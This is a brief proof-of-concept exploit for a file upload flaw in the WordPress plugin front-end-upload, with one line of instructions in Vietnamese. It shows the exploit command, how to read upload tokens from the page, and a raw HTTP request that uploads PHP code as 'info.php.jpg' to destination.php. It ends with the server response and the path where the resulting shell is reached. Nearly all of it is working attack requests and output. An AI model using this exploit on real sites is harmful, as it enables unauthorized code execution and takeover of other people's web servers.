Exploit:

python exploit.py http://localhost/wordpress/?p=1


------------------------------------------------------------------
Burpsuite Request:

GET http://localhost/wordpress/?p=1
lấy ra 2 tham số là feu, và hash trong response BODY, sau đó lấy 2 biến này thêm vào header ở request sau:


POST /wordpress/wp-content/plugins/front-end-upload/destination.php?name=info.php.jpg HTTP/1.1
Host: localhost
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.19.1
referer: http://localhost/wordpress/2018/07/18/hello-world/
feu: feuupload_5b7d1a4578151
hash: feuhash_5b7d1a4568d91
Content-Length: 18

<?php phpinfo();?>



=> RESPONSE

HTTP/1.1 200 OK
Date: Wed, 22 Aug 2018 08:23:44 GMT
Server: Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.5.35
X-Powered-By: PHP/5.5.35
Expires: Mon, 26 Jul 1997 05:00:00 GMT
Last-Modified: Wed, 22 Aug 2018 08:23:44 GMT
Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 32
Connection: close
Content-Type: text/html

879c32237d4856fc545e79534c9cade9

access shell on folder:
 /wp-content/uploads/feu_RANDOM-MD5/info.php.jpg
